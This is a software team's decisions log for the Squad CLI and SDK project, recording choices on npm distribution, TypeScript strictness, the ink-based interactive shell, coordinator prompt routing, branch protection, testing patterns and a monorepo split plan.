# Decisions

> Team decisions that all agents must respect. Managed by Scribe.

### 2026-02-21: SDK distribution stays on GitHub
**By:** Keaton (carried from beta)
**What:** Distribution is `npx github:bradygaster/squad` — never move to npmjs.com.
**Why:** GitHub-native distribution aligns with the Copilot ecosystem. No registry dependency.

### 2026-02-21: v1 docs are internal only
**By:** Keaton (carried from beta)
**What:** No published docs site for v1. Documentation is team-facing only.
**Why:** Ship the runtime first. Public docs come later when the API surface stabilizes.

### 2026-02-21: Type safety — strict mode non-negotiable
**By:** Edie (carried from beta)
**What:** `strict: true`, `noUncheckedIndexedAccess: true`, no `@ts-ignore` allowed.
**Why:** Types are contracts. If it compiles, it works. Strict mode catches entire categories of bugs.

### 2026-02-21: Hook-based governance over prompt instructions
**By:** Baer (carried from beta)
**What:** Security, PII, and file-write guards are implemented via the hooks module, NOT prompt instructions.
**Why:** Prompts can be ignored or overridden. Hooks are code — they execute deterministically.

### 2026-02-21: Node.js ≥20, ESM-only, streaming-first
**By:** Fortier (carried from beta)
**What:** Runtime target is Node.js 20+. ESM-only (no CJS shims, no dual-package hazards). Async iterators over buffers.
**Why:** Modern Node.js features enable cleaner async patterns. ESM-only eliminates CJS interop complexity.

### 2026-02-21: Casting — The Usual Suspects, permanent
**By:** Squad Coordinator (carried from beta)
**What:** Team names drawn from The Usual Suspects (1995). Scribe is always Scribe. Ralph is always Ralph. Names persist across repos and replatforms.
**Why:** Names are team identity. The team rebuilt Squad beta with these names.

### 2026-02-21: Proposal-first workflow
**By:** Keaton (carried from beta)
**What:** Meaningful changes require a proposal in `docs/proposals/` before execution.
**Why:** Proposals create alignment before code is written. Cheaper to change a doc than refactor code.

### 2026-02-21: Tone ceiling — always enforced
**By:** McManus (carried from beta)
**What:** No hype, no hand-waving, no claims without citations. Every public-facing statement must be substantiated.
**Why:** Trust is earned through accuracy, not enthusiasm.

### 2026-02-21: Zero-dependency scaffolding preserved
**By:** Rabin (carried from beta)
**What:** CLI remains thin (`cli.js`), runtime stays modular. Zero runtime dependencies for the CLI scaffolding path.
**Why:** Users should be able to run `npx` without downloading a dependency tree.

### 2026-02-21: Merge driver for append-only files
**By:** Kobayashi (carried from beta)
**What:** `.gitattributes` uses `merge=union` for `.squad/decisions.md`, `agents/*/history.md`, `log/**`, `orchestration-log/**`.
**Why:** Enables conflict-free merging of team state across branches. Both sides only append content.

### 2026-02-21T20:25:35Z: User directive — Interactive Shell as Primary UX
**By:** Brady (via Copilot)
**What:** Squad becomes its own interactive CLI shell. `squad` with no args enters a REPL where users talk directly to the team. Copilot SDK is the LLM backend — Squad shells out to it for completions, not the other way around.
**Why:** Copilot CLI has usability issues (unreliable agent handoffs, no visibility into background work). Squad needs to own the full interactive experience with real-time status and direct coordination UX.
**How:** Terminal UI with `ink` (React for CLIs), SDK session management with streaming, direct agent spawning (one session per agent). This becomes Wave 0 (foundation).
**Decisions needed:** Terminal UI library (ink vs. blessed), streaming (event-driven vs. polling), session lifecycle (per-agent vs. pool), background cleanup (explicit vs. timeout).

### 2026-02-21T21:22:47Z: User directive — rename `squad watch` to `squad triage`
**By:** Brady (via Copilot)
**What:** "squad watch" should be renamed to "squad triage" — user feedback that the command name should reflect active categorization/routing, not passive observation.
**Why:** User request — captured for team memory.

### 2026-02-21T21:35:22Z: User directive — CLI command naming: `squad loop`
**By:** Brady (via Copilot)
**What:** The work monitor CLI command should be `squad loop`, not `squad ralph` or `squad monitor`. "Loop" is universally understood — no Squad lore needed. Finalized preference (supersedes Keaton's recommendations in favor of `squad monitor`). Update issue #269 accordingly.
**Why:** User request — final naming decision. Brady prefers `squad loop` for clarity and universal understanding.

### 2026-02-21T21:35:22Z: User directive — `squad hire` CLI command
**By:** Brady (via Copilot)
**What:** Add a `squad hire` CLI command. This is the team creation entry point — the init experience with personality. "squad hire" instead of "squad init".
**Why:** User request — Brady wants CLI commands that feel natural and match Squad's identity.

### 2026-02-21: CLI rename — `watch` → `triage` (recommended) (consolidated)
**By:** Keaton (Lead)
**What:** Rename `squad watch` to `squad triage`. Keep `watch` as silent alias for backward compatibility. Explicitly recommend against `squad ralph` as a CLI command. Suggest `squad monitor` or `squad loop` instead to describe the persistent monitoring function.
**Why:** "Triage" is 40% more semantically accurate (matches GitHub's own terminology and incident-management patterns). "Ralph" is internal lore — opaque to new users and violates CLI UX conventions (all user-facing commands are action verbs or domain nouns). `squad monitor` is self-describing and professional.
**Details:** Change is low-risk. Silent alias prevents breakage. Confidence 85% for triage rename, 90% confidence Ralph shouldn't be user-facing.
**Reference:** Keaton analysis in `.squad/decisions/inbox/keaton-cli-rename.md`

### 2026-02-21: SDK M0 blocker — upgrade from `file:` to npm reference (resolved)
**By:** Kujan (SDK Expert), Edie (implementation)
**What:** Change `optionalDependencies` from `file:../copilot-sdk/nodejs` to `"@github/copilot-sdk": "^0.1.25"`. The SDK is published on npm (28 versions, SLSA attestations). This one-line change unblocks npm publish and removes CI dependency on sibling directory.
**Why:** The `file:` reference is the only M0 blocker. Squad's SDK surface is minimal (1 runtime import: `CopilotClient`). Keep SDK in `optionalDependencies` to preserve zero-dependency scaffolding guarantee (Rabin decision).
**Verified:** Build passes (0 errors), all 1592 tests pass with npm reference. No tests require live Copilot CLI server. PR #271 merged successfully.
**Reference:** Kujan audit + Edie implementation in `.squad/decisions/inbox/edie-sdk-swap.md`
**Closes:** #190, #193, #194

### 2026-02-21T21:35:22Z: User directive — no temp/memory files in repo root
**By:** Brady (via Copilot)
**What:** NEVER write temp files, issue files, or memory files to the repo root. All squad state/scratch files belong in .squad/ and ONLY .squad/. Root tree of a user's repo is sacred — don't clutter it.
**Why:** User request — hard rule. Captured for all agents.

### 2026-02-21: npm workspace protocol for monorepo
**By:** Edie (TypeScript Engineer)
**Date:** 2026-02-21
**PR:** #274
**What:** Use npm-native workspace resolution (version-string references like `"0.6.0-alpha.0"`) instead of `workspace:*` protocol for cross-package dependencies.
**Why:** The `workspace:*` protocol is pnpm/Yarn-specific. npm workspaces resolve workspace packages automatically by matching the package name in the `workspaces` glob — a version-string reference is all that's needed. Using npm-native semantics avoids toolchain lock-in and keeps the monorepo compatible with stock npm.
**Impact:** All future inter-package dependencies in `packages/*/package.json` should use the actual version string, not `workspace:*`.

### 2026-02-21: Resolution module placement and API separation
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #210, #211
**What:**
- `resolveSquad()` and `resolveGlobalSquadPath()` live in `src/resolution.ts` at the repo root, not in `packages/squad-sdk/`.
- The two functions are independent — `resolveSquad()` does NOT automatically fall back to `resolveGlobalSquadPath()`.
**Why:**
1. **Placement:** Code hasn't migrated to the monorepo packages yet. Putting it in `packages/squad-sdk/src/` would create a split that doesn't match the current build pipeline (`tsc` compiles `src/` to `dist/`). When the monorepo migration happens, `src/resolution.ts` moves with everything else.
2. **Separation of concerns:** Issue #210 says "repo squad always wins over personal squad" — that's a *policy* decision for the consumer, not for the resolution primitives. Keeping the two functions independent lets CLI/runtime compose them however needed (e.g., try repo first, fall back to global, or merge both).
**Impact:** Low. When packages split happens, move `src/resolution.ts` into `packages/squad-sdk/src/`. The public API shape stays the same.

### 2026-02-21: Changesets setup — independent versioning for squad-sdk and squad-cli
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-21
**Re:** #208
**What:** Installed and configured @changesets/cli v2 for independent package versioning across the monorepo.
**Configuration:**
- `access`: `"public"` (both packages will be published)
- `baseBranch`: `"main"` (release branch for changesets)
- `fixed`: `[]` (empty — no linked releases)
- `linked`: `[]` (empty — no linked releases)
- `updateInternalDependencies`: `"patch"` (default, appropriate for SDK→CLI dependency)
**Why:** Squad is a monorepo with two distinct packages (squad-sdk and squad-cli) with different release cadences and audiences. Independent versioning prevents unnecessary releases and version inflation when only one package changes.
**Implementation:** `.changeset/config.json` created, npm script `changeset:check` added to `package.json` for CI validation.
**Next Steps:** Contributors use `npx changeset add` before merge; release workflow runs `changeset publish` to GitHub.

### 2026-02-21: --global flag and status command pattern
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #212, #213
**What:**
- `--global` flag on `init` and `upgrade` routes to `resolveGlobalSquadPath()` instead of `process.cwd()`.
- `squad status` composes both `resolveSquad()` and `resolveGlobalSquadPath()` to show which squad is active and why.
- All routing logic stays in `src/index.ts` main() — init.ts and upgrade.ts are path-agnostic (they take a `dest` string).
**Why:**
1. **Thin CLI contract:** init and upgrade already accept a destination directory. The `--global` flag is a CLI concern, not a runtime concern — so it lives in the CLI routing layer only.
2. **Composition over fallback:** `squad status` demonstrates the intended consumer pattern from #210/#211: try repo resolution first, then check global path. The resolution primitives stay independent.
3. **Debugging UX:** Status shows repo resolution, global path, and global squad existence — all the info needed to debug "why isn't my squad loading?" issues.
**Impact:** Low. Single-file change to `src/index.ts`. No changes to resolution algorithms or init/upgrade internals.

### 2026-02-21: No repo root clutter — ensureSquadPath() guard
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #273

**What:**
- Added `ensureSquadPath(filePath, squadRoot)` in `src/resolution.ts` — a guard that validates a target path is inside `.squad/` or the system temp directory before any write occurs. Throws with a descriptive error if the path is outside both.
- Exported from the public API (`src/index.ts`).

**Why:**
Brady's hard rule: ALL squad scratch/temp/state files MUST go in `.squad/` only. During issue creation, 20+ temp files were written directly to the repo root. This guard provides a single validation function that any file-writing code path can call to enforce the policy deterministically (per the hooks-over-prompts decision).

**Audit findings:**
- 30+ file write calls across `src/` — most already write into `.squad/` subdirectories or user-requested destinations.
- The `tools/index.ts` write_file tool and `cli/commands/export.ts` write to user-specified paths (intentional, user-requested).
- No existing code paths were changed — this is a new guard utility for future enforcement.

**Impact:** Low. Additive-only change. Existing behavior unchanged. Future code that writes temp/scratch files should call `ensureSquadPath()` before writing.

### 2026-02-21: CLI routing logic is testable via composition, not process spawning
**By:** Hockney (Tester)
**Date:** 2026-02-21
**Re:** #214

**What:** Integration tests for `squad status` and `--global` flag test the *routing logic* (the conditional expressions from `main()`) directly, rather than spawning a child process and parsing stdout.

**Why:**
1. `main()` in `src/index.ts` calls `process.exit()` and is not exported — spawning would be flaky and slow.
2. The routing logic is simple conditionals over `resolveSquad()` and `resolveGlobalSquadPath()` — testing those compositions directly is deterministic and fast.
3. If `main()` is ever refactored to export a testable function, these tests can be upgraded — the assertions stay the same.

**Impact:** Low. Sets a pattern for future CLI integration tests: test the logic, not the process.

### 2026-02-21: Ink + React dependency versions
**By:** Edie (TypeScript Engineer)
**Date:** 2026-02-21
**Re:** #233
**PR:** #281

**What:**
- **ink@6.8.0** — latest stable, ESM-native, no CJS shims required
- **react@19.2.4** — required by ink 6.x (peer dependency); React 19 is ESM-friendly
- **ink-testing-library@4.0.0** — matches ink 6.x major version pairing
- **@types/react@19.2.14** — TypeScript types for React 19

**Why:** ink 6.x + React 19 are fully ESM-native — aligns with our ESM-only policy. ink-testing-library enables unit-testing ink components without a real terminal. All added as root-level deps for now; can be scoped to `packages/squad-cli` during monorepo migration.

**Impact:** Low. No source changes — dependency additions only. Build passes (tsc strict), all 1621 tests pass.

### 2026-02-21: GitHub-native distribution deprecated in favor of npm
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #219

**What:**
- Root `cli.js` now prints a deprecation warning to stderr when invoked via `npx github:bradygaster/squad`.
- Users are directed to `npm install -g @bradygaster/squad-cli` or `npx @bradygaster/squad-cli`.
- The warning is non-blocking — existing behavior continues after the notice.

**Why:** The `@bradygaster/squad-cli` and `@bradygaster/squad-sdk` packages are now published to npm. The GitHub-native distribution (`npx github:bradygaster/squad`) was the original entry point but is now superseded. This deprecation notice gives users a migration path before the GitHub-native entry point is eventually removed.

**Supersedes:** The earlier "SDK distribution stays on GitHub" decision (Keaton, carried from beta). npm is now the primary distribution channel.

**Impact:** Low. Additive-only change to the bundled `cli.js`. No behavior change — just a stderr warning.

### 2026-02-21: Shell chrome patterns and session registry design
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #236, #237

**Shell Chrome:** The interactive shell header uses box-drawing characters (`╭╰│─`) for visual chrome. Version is read from `package.json` at runtime via `createRequire(import.meta.url)` — no hardcoded version strings. Box-drawing chrome is universally supported in modern terminals and provides clear visual framing without external dependencies. Using `createRequire` for JSON import follows the existing pattern in `src/build/github-dist.ts` and avoids ESM JSON import assertions.

**Exit handling:** Three exit paths — `exit` command, `/quit` command, and Ctrl+C (SIGINT). All produce the same cleanup message ("👋 Squad out.") for consistency.

**Session Registry:** `SessionRegistry` is a simple Map-backed class with no persistence, no event emitting, and no external dependencies. It tracks agent sessions by name with status lifecycle: `idle` → `working` → `streaming` → `idle`/`error`. Designed as a pure state container that the ink UI will consume. The Map-based approach allows O(1) lookup by agent name, which is the primary access pattern for status display.

**Impact:** Low. Two files changed. No API surface changes outside the shell module. SessionRegistry is exported for future consumption but has no current consumers.

### 2026-02-21: TSX compilation enabled in root tsconfig
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #242, #243, #244

**What:** Added `"jsx": "react-jsx"` to the root `tsconfig.json` to enable TSX compilation for ink-based React components in `src/cli/shell/components/`.

**Why:** The shell UI uses ink (React for CLIs), which requires JSX support. `react-jsx` is the modern transform — no need to import React in every file for JSX (though we do for explicitness). This is a project-wide setting because all TSX files live under `src/` which is the root `rootDir`.

**Components created:**
- `AgentPanel.tsx` — agent status display (consumes `AgentSession` from `types.ts`)
- `MessageStream.tsx` — streaming message output (consumes `ShellMessage` from `types.ts`)
- `InputPrompt.tsx` — readline input with history navigation
- `components/index.ts` — barrel export

All components are pure presentational — no SDK calls, no side effects. State management is the responsibility of the shell orchestrator.

**Impact:** Low. Only affects `.tsx` files. No existing `.ts` files are impacted. The setting is compatible with strict mode and NodeNext module resolution.

### 2026-02-21: Shell module structure and entry point routing
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #234, #235
**PR:** #282

**What:**
- `src/cli/shell/` module created with `index.ts`, `types.ts`, and `components/` placeholder directory.
- `squad` with no args now launches `runShell()` (interactive shell) instead of `runInit()`.
- `squad init` remains available as an explicit subcommand — no functionality removed.

**Why:**
1. **Entry point change:** Brady's directive makes the interactive shell the primary UX. Running `squad` with no args should enter the shell, not re-run init. Init is still available via `squad init`.
2. **Placeholder over premature implementation:** `runShell()` is console.log-only. Ink dependency is handled separately (#233). This keeps the shell module structure ready without coupling to the UI library.
3. **Types first:** `ShellState`, `ShellMessage`, and `AgentSession` interfaces define the shell's data model before any UI code exists. This lets other agents (ink wiring, agent spawning) code against stable types.

**Impact:** Low. No existing tests broken (1621/1621 pass). The only behavior change is `squad` (no args) prints a shell header and exits instead of running init. `squad init` and `squad --help` / `squad help` continue to work as before.

### 2026-02-21: Agent spawn infrastructure pattern
**By:** Fenster (Core Dev)
**Date:** 2026-02-21
**Re:** #238

**What:** Created `src/cli/shell/spawn.ts` with three exported functions:
- `loadAgentCharter(name, teamRoot?)` — filesystem charter loading via `resolveSquad()`
- `buildAgentPrompt(charter, options?)` — system prompt construction from charter + context
- `spawnAgent(name, task, registry, options?)` — full spawn lifecycle with SessionRegistry integration

SDK session creation (CopilotClient) is intentionally stubbed. The spawn infrastructure is complete; session wiring comes when we understand the SDK's session management API.

**Why:**
1. **Separation of concerns:** Charter loading, prompt building, and session lifecycle are independent functions. This lets stream bridge and coordinator reuse `buildAgentPrompt` and `spawnAgent` without coupling.
2. **Testability:** `teamRoot` parameter on `loadAgentCharter` allows tests to point at a fixture directory without mocking `resolveSquad()`.
3. **Stub-first:** Rather than guessing the CopilotClient session API shape, we built the surrounding infrastructure. The TODO is a single integration point — when the SDK surface is clear, the change is surgical.

**Impact:** Low. Additive-only. No existing behavior changed. Two files modified: `spawn.ts` (new), `index.ts` (barrel exports added).

### 2026-02-21: Session lifecycle owns team discovery
**By:** Fortier (Node.js Runtime)
**Date:** 2026-02-21
**Re:** #240

**What:** `ShellLifecycle.initialize()` is the single entry point for team discovery in the interactive shell. It reads `.squad/team.md`, parses the Members table, and registers active agents in `SessionRegistry`. No other shell component should independently parse `team.md` or discover agents.

**Why:**
1. **Single responsibility:** Team discovery is a lifecycle concern — it happens once at shell startup. Scattering `team.md` parsing across components would create divergent interpretations of the manifest format.
2. **Testability:** By owning initialization, `ShellLifecycle` can be tested with a mock filesystem (or temp `.squad/` directory) without touching the registry or renderer.
3. **State consistency:** The lifecycle class is the source of truth for shell state. If initialization fails (missing `.squad/`, missing `team.md`), the state transitions to `error` and downstream components can check `getState().status` rather than catching exceptions everywhere.

**Impact:** Low. Additive-only. Future shell features (command routing, agent spawning) should call `lifecycle.getDiscoveredAgents()` instead of re-parsing `team.md`.

### 2026-02-21: StreamBridge is an event sink, not a subscriber
**By:** Fortier (Node.js Runtime)
**Date:** 2026-02-21
**Re:** #239

**What:** `StreamBridge` receives `StreamingEvent` objects via `handleEvent()` but does not register itself with `StreamingPipeline`. The wiring (`pipeline.onDelta(e => bridge.handleEvent(e))`) is the caller's responsibility.

**Why:**
1. **Testability:** The bridge can be tested with plain event objects — no pipeline instance needed.
2. **Flexibility:** The shell entry point controls which events reach the bridge (e.g., filtering by session, throttling for UI frame rate).
3. **Single responsibility:** The bridge translates events to callbacks; it doesn't manage subscriptions or lifecycle.

**Impact:** Low. Pattern applies to all future bridges between the pipeline and UI layers (ink components, web sockets, etc.).

### 2026-02-21: Shell module test patterns — fixtures over mocks
**By:** Hockney (Tester)
**Date:** 2026-02-21
**Re:** #248

**What:** Shell module tests use `test-fixtures/.squad/` with real files (team.md, routing.md, agent charters) instead of mocking fs calls. The `loadAgentCharter` and `buildCoordinatorPrompt` functions accept a `teamRoot` parameter that enables this pattern.

**Why:**
1. Real file reads catch encoding issues, path resolution bugs, and parsing edge cases that mocks hide.
2. The `teamRoot` parameter was already designed into the API — tests should use it.
3. StreamBridge tests use callback spies (arrays capturing calls) rather than vi.fn() — simpler to assert on and read.

**Impact:** Low. Establishes fixture patterns for future shell module tests. test-fixtures/.squad/ is now a shared test resource.

### 2026-02-21: Branch protection configuration
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-21
**Re:** #209

**Main Branch Protection:** Require PR + passing build status checks. All changes to main require a PR (not direct push). PR cannot be merged until `build` check passes (CI/CD gate). Zero approving reviews required — allows team to use PR merge buttons freely (no blocking review workflow needed). Admins not exempted (same rules apply to everyone, strengthens process integrity).

**Insider Branch:** No protection — allows direct pushes. Insider releases are automation-driven; direct branch push is the automation's path.

**Implementation:** Used GitHub API (REST v3): `PUT /repos/{owner}/{repo}/branches/main/protection` with required_status_checks + required_pull_request_reviews. `DELETE /repos/{owner}/{repo}/branches/insider/protection` confirmed no-op (no existing rule).

**Note:** Status check context name is `"build"` — must match the exact check name from CI workflow. If CI workflow renames the check, branch protection must be updated to match.

### 2026-02-21: Insider publish package scaffolds
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-21
**Re:** #215
**PR:** #283

**What:** Added minimal publishable entry points to `packages/squad-sdk/` and `packages/squad-cli/` so the insider publish workflow can produce valid npm packages.

**squad-sdk:**
- `src/index.ts`: exports `VERSION` constant (placeholder — full source migration comes later)
- `tsconfig.json`: extends root, outputs to `dist/` with declarations
- `package.json`: added `files`, `scripts.build`

**squad-cli:**
- `src/cli.ts`: placeholder binary (`#!/usr/bin/env node`)
- `tsconfig.json`: extends root, outputs to `dist/` with declarations
- `package.json`: added `files`, `scripts.build`; `bin` already pointed to `./dist/cli.js`

**Root:** `build` script updated: `tsc && npm run build --workspaces --if-present`

**Why:** The insider publish pipeline triggers on push to `insider` branch but both workspace packages were empty scaffolds — no source, no build output, nothing to publish. This adds the minimum viable content so `npm publish` succeeds and the insider channel can be verified end-to-end.

**Constraints respected:** ESM-only, TypeScript strict mode, Node.js >=20, squad-cli depends on squad-sdk via version string, `files` lists ensure only `dist/` and `README.md` ship in the published package.

**Impact:** Low. Does not migrate real source code — these are placeholders. Does not add tests for workspace packages (nothing to test yet).

### 2026-02-21: Distribution moves to npm for production
**By:** Rabin (Distribution)
**Date:** 2026-02-21
**Re:** #216

**What:** Squad packages (`@bradygaster/squad-sdk` and `@bradygaster/squad-cli`) are now distributed via npmjs.com. This supersedes the beta-era decision "Distribution is `npx github:bradygaster/squad` — never move to npmjs.com."

**Why:** The project has matured from beta to production. npm is the standard distribution channel for Node.js packages. The insider publish (`0.6.0-alpha.0`) validated the pipeline. Production publish (`0.6.0`) is the natural next step.

**Workflow:** Tag push `v*` on `main` triggers `.github/workflows/squad-publish.yml`. Auth is CI-only via `setup-node` + `NODE_AUTH_TOKEN`. No root `.npmrc` needed. No `--provenance` (private repo limitation).

**Impact:** Users install via `npm install @bradygaster/squad-cli` (or `npx @bradygaster/squad-cli`). The GitHub-native `npx github:bradygaster/squad` path may still work but is no longer the primary distribution channel.

### 2026-02-21: Coordinator prompt structure — three routing modes
**By:** Verbal (Prompt Engineer)
**Date:** 2026-02-21
**Re:** #241

**What:** The coordinator system prompt (`buildCoordinatorPrompt()`) uses a structured response format with three routing modes:
- `DIRECT:` — coordinator answers inline, no agent spawn
- `ROUTE:` + `TASK:` + `CONTEXT:` — single agent delegation
- `MULTI:` with bullet list — fan-out to multiple agents

The parser (`parseCoordinatorResponse()`) extracts a `RoutingDecision` from the LLM response. Unrecognized formats fall back to `DIRECT` (safe default — never silently drops input).

**Why:**
1. **Structured output over free-form:** Keyword prefixes (`ROUTE:`, `DIRECT:`, `MULTI:`) are cheap to parse and reliable across model temperatures. No JSON parsing needed.
2. **Fallback-to-direct:** If the LLM doesn't follow the format, the response is surfaced to the user rather than lost. This prevents silent failures in the routing layer.
3. **Prompt composition from files:** team.md and routing.md are read at prompt-build time, not baked in. This means the coordinator adapts to team changes without code changes.

**Impact:** Low. Additive module. No changes to existing shell behavior. Future work will wire this into the readline loop and SDK session.
### 2026-02-21: CRLF normalization — single utility, applied at parser entry points
**By:** Fenster (Core Dev)
**Re:** #220, #221 (Epic #181)

**What:**
- Created `src/utils/normalize-eol.ts` exporting `normalizeEol(content: string): string` — replaces `\r\n` and `\r` with `\n`.
- Applied as the first line of 8 parser functions across 6 files: markdown-migration.ts (3 parsers), routing.ts, charter-compiler.ts, skill-loader.ts, agent-doc.ts, doc-sync.ts.

**Why:**
On Windows with `core.autocrlf=true`, file reads return `\r\n` line endings. Every parser that calls `.split('\n')` would leave stray `\r` characters in parsed values — breaking regex matches, table parsing, and string comparisons. Normalizing at the parser entry point is the minimal defensive guard: one line per function, no behavioral change on LF-only systems.

**Pattern:**
Always normalize at the *entry* of the parsing function, not at the file-read callsite. This ensures parsers are self-contained and safe regardless of how content arrives (file read, API response, test fixture).

**Impact:**
Low. Additive-only. No test changes needed. Existing tests pass because test strings are already LF-only. The guard is transparent for LF inputs.

### 2026-02-21: CLI entry point split — src/index.ts is a pure barrel
**By:** Edie (TypeScript Engineer)
**Re:** #187

**What:**
- `src/index.ts` is now a pure re-export barrel with ZERO side effects. No `main()`, no `process.exit()`, no argument parsing.
- `src/cli-entry.ts` contains the full `main()` function and all CLI routing logic.
- `VERSION` is exported from `index.ts` (public API constant); `cli-entry.ts` imports it.
- `SquadError` is now explicitly exported from the barrel.

**Why:**
Anyone importing `@bradygaster/squad` as a library (e.g., SquadUI) was triggering CLI argument parsing and `process.exit()` on import. This poisoned the library entry point. The split makes `dist/index.js` safe for library consumption while `dist/cli-entry.js` remains the CLI binary.

**Impact:**
Low. Two files changed. Build passes (tsc strict), all 1683 tests pass. No changes to package.json `bin` or `main`.

**Future:**
When source migrates to `packages/squad-cli/`, the CLI entry point moves with it. The barrel (`packages/squad-sdk/src/index.ts`) stays side-effect-free.

### 2026-02-21: Process.exit() refactor — library-safe CLI functions
**By:** Kujan (SDK Expert)
**Re:** #189

**What:**
- `fatal()` now throws `SquadError` instead of calling `process.exit(1)`.
- `src/index.ts` is a pure barrel export with zero side effects (no `main()`, no `process.exit()`).
- `src/cli-entry.ts` is the sole CLI entry point — it catches `SquadError` and calls `process.exit(1)`.
- `runWatch()` resolves its Promise on SIGINT/SIGTERM instead of `process.exit(0)`.
- `runShell()` closes readline on SIGINT instead of `process.exit(0)`.
- `SquadError` class is exported from the public API.

**Why:**
SquadUI (VS Code extension) imports CLI functions as a library. `process.exit()` kills the entire VS Code extension host. All library-consumable functions must throw errors or return results, never call `process.exit()`. Only the CLI entry point (the thin presentation layer) may call `process.exit()`.

**Pattern established:**
- Library functions: throw `SquadError` or return result objects
- CLI entry point: catches errors, formats output, calls `process.exit()`
- Library consumers: catch `SquadError` for structured error handling

**Impact:**
Medium. Changes error handling contract for all functions that used `fatal()`. Backwards-compatible for CLI users (same behavior). Library consumers now get catchable errors instead of process termination.

### 2026-02-21: User directive — docs as you go
**By:** bradygaster (via Copilot)
**What:** Doc and blog as you go during SquadUI integration work. Doesn't have to be perfect — a proper docs pass comes later — but keep docs updated incrementally.
**Why:** User request — captured for team memory

### 2026-02-23: Aspire Dashboard Scenario Documentation
**By:** Saul (Aspire & Observability)
**Date:** 2026-02-23
**Status:** COMPLETED

### 2026-02-23: Make sendAndWait timeout configurable
**Author:** Cheritto (TUI Engineer)
**Date:** 2026-02-23
**Status:** Implemented
**Issue:** #325
**PR:** #347

Added `TIMEOUTS.SESSION_RESPONSE_MS` to `packages/squad-sdk/src/runtime/constants.ts` — default 600,000ms (10 minutes), overridable via `SQUAD_SESSION_TIMEOUT_MS` env var. Updated `packages/squad-cli/src/cli/shell/index.ts` to use the constant instead of hard-coded 120,000ms timeout. All 41 streaming tests pass. Users can now set `SQUAD_SESSION_TIMEOUT_MS=900000` for 15-minute timeouts.

### 2026-02-23: E2E Test Coverage Expansion
**By:** Breedan (E2E Test Engineer)
**Date:** 2026-02-23
**Status:** Accepted
**PR:** #348 (closes #326)

Added 14 new Gherkin scenarios across 6 new feature files, bringing total to 21 acceptance scenarios + 6 UX gate tests (27 total). New harness capabilities: `cwd` option on `spawnWithArgs()`, absolute path resolution, `mkdtempSync` temp dir creation, negative assertion step. Coverage areas: init-command, status-extended, doctor-extended, help-comprehensive, error-paths, exit-codes.

### 2026-02-23: Hostile QA Bug Catalog — Issue #327
**By:** Waingro
**Date:** 2026-02-23
**Status:** Reported — awaiting triage

Found 2 P1/P2 bugs: (1) `--version` output omits "squad" prefix (P1, location: packages/squad-cli/src/cli-entry.ts:48), (2) Empty/whitespace args launch interactive shell in non-TTY (P2, location: packages/squad-cli/src/cli-entry.ts:102). Added 32 hostile QA Gherkin scenarios across 7 feature files and 80+ adversarial string corpus. All corrupt config scenarios handled gracefully; unicode edge cases pass cleanly.

### 2026-02-23: Accessibility Audit — Squad CLI
**By:** Nate (Accessibility Reviewer)
**Date:** 2026-02-23
**Issue:** #328 — Accessibility Audit
**Verdict:** CONDITIONAL PASS

Summary: 2 passes (Keyboard Navigation ✅, Help Text ✅), 2 failures (Color Contrast & NO_COLOR ❌, Error Guidance ❌). Priority fixes: (1) P1 — Respect `NO_COLOR` in terminal.ts and gate ANSI codes in output.ts. (2) P1 — Add remediation hints to missing team.md error (lifecycle.ts) and charter-not-found error (spawn.ts). Nice-to-have: P2 Wire Tab autocomplete, add remediation to SDK-not-connected errors; P3 Add Escape key, include keyboard shortcuts in /help output.

**What:** Created `docs/scenarios/aspire-dashboard.md` — a single, focused scenario doc for using Squad with the Aspire dashboard. Covers what Aspire is, how to launch it via Docker, how to connect Squad SDK to it, what traces/metrics appear in the UI, troubleshooting, and pro tips. Updated `docs/build.js` to include the new scenario in the explicit ordering (added to SECTION_ORDER for scenarios).

**Tone:** Action-oriented, welcoming, prompt-first — matches existing Squad docs (see `solo-dev.md` for reference style).

**Key Sections:**
1. What Is Aspire (standalone OTel dashboard, not .NET-specific)
2. Launch the container (docker run command + squad aspire convenience)
3. Connect Squad to Aspire (CLI env var + SDK programmatic)
4. Dashboard content (traces, metrics, resources with concrete examples)
5. Example workflow (start, run, observe)
6. Troubleshooting (no traces, slow dashboard, connection refused)
7. Pro tips (metric export frequency, custom service names, batch sizing)

**Implementation Details:** Reviewed `packages/squad-sdk/src/runtime/otel-*.ts` and `test/aspire-integration.test.ts` for accurate coverage of OTel integration. Aspire ports (18888 UI, 4317 OTLP gRPC), UNSECURED_ALLOW_ANONYMOUS mode, and gRPC-only protocol constraints all documented accurately.

**Verification:** Docs build verified — `npm run docs:build` generates 39 pages with `aspire-dashboard.html` correctly included in scenarios nav. Navigation in all scenario pages (e.g., solo-dev.html) correctly links to the new scenario.

**Why:** Brady requested a "try it now" guide for Aspire integration — single doc that covers launch AND connection, written for immediate action. This replaces scattered documentation and provides a clean entry point for developers wanting to observe Squad telemetry in real time.

### 2026-02-22: SDK/CLI File Split Plan — Definitive Mapping
**By:** Keaton (Lead)
**Status:** Decision
**Scope:** Monorepo restructure — move `src/` into `packages/squad-sdk/` and `packages/squad-cli/`

**Overview:** All 114 `.ts` files in root `src/` must be split between two workspace packages. The dependency direction is **one-way: CLI → SDK**. No SDK module imports from CLI. This is clean and the split is mechanical.

**SDK Package (`packages/squad-sdk/src/`):**
- **Directories:** adapter, agents, build, casting, client, config, coordinator, hooks, marketplace, ralph, runtime, sharing, skills, tools, utils (15 total)
- **Standalone files:** index.ts, resolution.ts, parsers.ts, types.ts
- **Exports:** Expanded to 18 subpath exports matching directory structure
- **Dependencies:** `@github/copilot-sdk` only (zero UI deps)

**CLI Package (`packages/squad-cli/src/`):**
- **Directories:** cli/ (all CLI submodules: core/, commands/, shell/, components/)
- **Standalone files:** cli-entry.ts (becomes `bin.squad` target)
- **Dependencies:** `@bradygaster/squad-sdk`, ink, react, esbuild

**Root Package:**
- **Role:** Workspace orchestrator only (not publishable)
- **Preserved:** `package.json` (workspace def), tsconfig.json (base config), vitest.config.ts, test/, test-fixtures/, templates/, docs/, .squad/
- **Removed:** main, types, bin, runtime dependencies

